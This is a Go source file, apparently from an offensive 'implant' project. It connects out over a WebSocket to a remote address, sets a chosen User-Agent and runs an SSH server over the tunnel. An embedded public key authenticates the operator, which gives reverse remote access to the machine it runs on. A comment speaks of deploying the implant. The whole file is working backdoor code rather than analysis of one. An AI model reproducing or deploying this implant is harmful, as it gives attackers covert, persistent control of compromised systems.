// https://groups.google.com/g/gorilla-web/c/VjXmApL1qA8

package ssh

import (
	"log"
	"net/http"
	"purpcmd/server/utils"

	"github.com/gorilla/websocket"
	"golang.org/x/crypto/ssh"
)

func Wsclient(ua, uri, remoteAdd string) error {
	stringPubKey := "ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDm7lFJASftWM9Bmw+sQnjNtr48wXhSRDf43XUhbfRBT05j5dZ4+2qUhPt5gugkECSINzOs2nGz0hkCFTGDqPIM="
	log.Printf("Connecting to ws://%s%s", remoteAdd, uri)

	head := http.Header{
		"User-Agent": {ua},
	}

	wclient, _, err := websocket.DefaultDialer.Dial("ws://"+remoteAdd+uri, head)
	if err != nil {
		return err
	}
	defer wclient.Close()

	// create new connect file
	// "New" from adapter to use websock as net.Conn
	webSockConn := utils.New(wclient)
	defer webSockConn.Close()

	s := Session{
		AuthKeys: make(map[string]bool),
	}

	PubKeyBytes := []byte(stringPubKey)
	s.PubKey, _, _, _, err = ssh.ParseAuthorizedKey(PubKeyBytes)
	utils.Err(err, 17)

	// Keep the fingerprint for authentication
	s.AuthKeys[FingerprintKey(s.PubKey)] = true

	config := &ssh.ServerConfig{
		PublicKeyCallback: s.pubCallBack, // Challenge with pubkey
	}

	// SSH private key is intentionally embedded in the implant binary.
	// Generate and replace this key pair before deploying:
	//   ssh-keygen -t ecdsa -f implant_host_key -N ""
	privKey := GeneratePrivKey()
	pkey, err := ssh.ParsePrivateKey(privKey)
	utils.Err(err, 18)
	config.AddHostKey(pkey)

	conn, chans, reqs, err := ssh.NewServerConn(webSockConn, config)
	utils.Err(err, 19)
	go ssh.DiscardRequests(reqs)

	s.HandServerConn(conn.Permissions.Extensions["x"], chans)

	return nil
}
